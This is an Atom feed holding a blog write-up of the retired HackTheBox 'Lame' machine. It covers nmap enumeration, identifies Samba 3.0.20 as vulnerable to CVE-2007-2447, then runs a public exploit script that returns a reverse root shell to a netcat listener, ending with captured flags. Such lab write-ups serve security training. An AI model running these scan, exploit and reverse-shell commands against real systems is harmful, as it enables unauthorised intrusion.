@@ -1,0 +1,207 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-02T21:29:57+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Lame Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/02/HTB_Lame_Walkthrough/" rel="alternate" type="text/html" title="Lame Machine Writeup- HackTheBox" /><published>2020-12-02T16:00:00+05:30</published><updated>2020-12-02T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/02/HTB_Lame_Walkthrough</id><content type="html" xml:base="http://localhost:4000/2020/12/02/HTB_Lame_Walkthrough/">&lt;p&gt;&lt;img src=&quot;/assets/images/Lame/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Open Ports Enumeration&lt;/li&gt;
+  &lt;li&gt;Samba version identified&lt;/li&gt;
+  &lt;li&gt;RCE for Samba version identified&lt;/li&gt;
+  &lt;li&gt;Foothold gained as root user&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Public Exploit Identification&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
+&lt;p&gt;The open port enumeration through targetRecon&lt;sup id=&quot;fnref:footnote&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:footnote&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; had identified four open ports namely &lt;strong&gt;FTP&lt;/strong&gt; (21), &lt;strong&gt;SSH&lt;/strong&gt; (22),
+&lt;strong&gt;NETBIOS-SSN&lt;/strong&gt; (139) and &lt;strong&gt;MICROSOFT-DS&lt;/strong&gt; (445). The scan had not identified any known vulnerabilities through 
+vulnerability scan. The results of the scan are given below.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b4bygroot@arcolinux:~/HTB/Tracks/Beginner_Track/Lame|
+⇒  targetRecon 10.10.10.3
+[+] Open Ports Scan
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+		21      ftp
+		22      ssh
+		139     netbios-ssn
+		445     microsoft-ds
+[+] Scripts Scan
+				 nmap -sV -A --script=default,vuln -p 21 10.10.10.3
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
+Nmap scan report for 10.10.10.3 (10.10.10.3)
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.3
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_sslv2-drown: 
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds
+
+				 nmap -sV -A --script=default,vuln -p 22 10.10.10.3
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:38 IST
+Nmap scan report for 10.10.10.3 (10.10.10.3)
+Host is up (0.22s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+| vulners: 
+|   cpe:/a:openbsd:openssh:4.7p1: 
+|       PACKETSTORM:101052      7.8     https://vulners.com/packetstorm/PACKETSTORM:101052      *EXPLOIT*
+|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
+|       CVE-2008-1657   6.5     https://vulners.com/cve/CVE-2008-1657
+|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
+|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
+|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
+|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
+|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
+|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
+|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
+|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
+
+				 nmap -sV -A --script=default,vuln -p 139 10.10.10.3
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:39 IST
+Nmap scan report for 10.10.10.3 (10.10.10.3)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+
+Host script results:
+|_clock-skew: mean: 2h39m33s, deviation: 3h33m46s, median: 8m23s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-12-02T03:20:12-05:00
+| smb-security-mode: 
+|   account_used: &amp;lt;blank&amp;gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 425.45 seconds
+
+				 nmap -sV -A --script=default,vuln -p 445 10.10.10.3
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-02 13:46 IST
+Nmap scan report for 10.10.10.3 (10.10.10.3)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE     VERSION
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+
+Host script results:
+|_clock-skew: mean: 2h38m28s, deviation: 3h32m14s, median: 8m23s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-12-02T03:25:02-05:00
+| smb-security-mode: 
+|   account_used: &amp;lt;blank&amp;gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: false
+|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 172.54 seconds
+
+[+] Summary 
+21      ftp     vsftpd 2.3.4
+				No vuln found
+22      ssh     OpenSSH 4.7p1 Debian 8ubuntu1
+				No vuln found
+139     netbios-ssn     Samba smbd 3.0.20-Debian
+				No vuln found
+445     microsoft-ds    Samba smbd 3.0.20-Debian
+				No vuln found
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;samba-service-enumeration&quot;&gt;Samba Service Enumeration&lt;/h1&gt;
+&lt;p&gt;Through the scan result from the previous section the &lt;strong&gt;Samba&lt;/strong&gt; service version of the target was identified as 
+&lt;strong&gt;&lt;em&gt;3.0.20&lt;/em&gt;&lt;/strong&gt;. Google-Fu with the version had identified a known vulnerability through &lt;strong&gt;&lt;em&gt;CVE-2007-2447&lt;/em&gt;&lt;/strong&gt;. Though
+metasploit module is available for the vulnerability, further googling had identified a working python exploit on GitHub
+by &lt;strong&gt;amriunix&lt;/strong&gt;&lt;sup id=&quot;fnref:footnote2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:footnote2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+&lt;p&gt;Before executing the exploit, the required package &lt;strong&gt;&lt;em&gt;pysmb&lt;/em&gt;&lt;/strong&gt; needed to be installed through &lt;em&gt;pip&lt;/em&gt;. 
+A &lt;em&gt;netcat&lt;/em&gt; listener, listening on port &lt;strong&gt;9095&lt;/strong&gt; was initiated after which the exploit script was executed as follows.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b4bygroot@arcolinux Lame &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python usermapScript.py 10.10.10.3 445 10.10.14.3 9095
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; CVE-2007-2447 - Samba usermap script
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Connecting &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload was sent - check netcat &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This resulted in a reverse shell on the netcat listener. Enumerating further had showed that the shell received was from
+the &lt;strong&gt;root&lt;/strong&gt; user, eliminating the need for privilege escalation. The same is shown on the section below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  Lame  nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 9095                                         
+Connection from 10.10.10.3:52271
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/span&gt;
+root@lame:/# &lt;span class=&quot;nb&quot;&gt;id
+id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+root@lame:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+0a4e1bf944cdc7df8c2f1eb56bf8030d
+root@lame:/# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/makis/user.txt
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/makis/user.txt
+a392eccf53d48a4abf840247bd155f80
+root@lame:/# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Lame/rootShell.png&quot; alt=&quot;Root Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;system-own&quot;&gt;System Own&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Lame/machineOwn.png&quot; alt=&quot;System Owned&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:footnote&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/b4bygroot/TargetRecon&quot;&gt;targetRecon&lt;/a&gt; &lt;a href=&quot;#fnref:footnote&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:footnote2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/amriunix/CVE-2007-2447&quot;&gt;CVE-2007-2447 Samba usermap script&lt;/a&gt; &lt;a href=&quot;#fnref:footnote2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="linux" /><category term="samba" /><category term="CVE-2007-2447" /><category term="without metasploit" /><summary type="html">A retired linux box from HackTheBox, owned by exploiting the known vulnerability on the installed Samba version.</summary></entry></feed>
